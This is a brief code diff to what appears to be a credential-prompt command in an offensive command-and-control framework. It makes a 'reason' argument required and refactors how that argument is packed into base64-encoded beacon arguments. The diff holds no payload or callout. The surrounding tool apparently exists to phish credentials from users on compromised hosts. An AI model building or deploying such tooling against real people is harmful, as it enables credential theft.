@@ -48,7 +48,7 @@ class AskCredsArguments(TaskArguments):
                 parameter_group_info=[
                     ParameterGroupInfo(
                         ui_position=1,
-                        required=False,
+                        required=True,
                         default_value=""
                         )
                     ],
@@ -110,7 +110,8 @@ class AskCredsCommand(CommandBase):
         
         # Create our BeaconPack object to handle the Argument packing
         OfArgs = []
-        OfArgs.append(generateWString(task.args.get_arg('reason')))
+        reason = task.args.get_arg("reason")
+        OfArgs.append(generateWString(reason))
         encoded_args = base64.b64encode(SerialiseArgs(OfArgs))
         # Pack our argument into our buffer using BeaconPack (You'll do this multiple times for each parameter)
         #bp.addWstr(task.args.get_arg("path"))
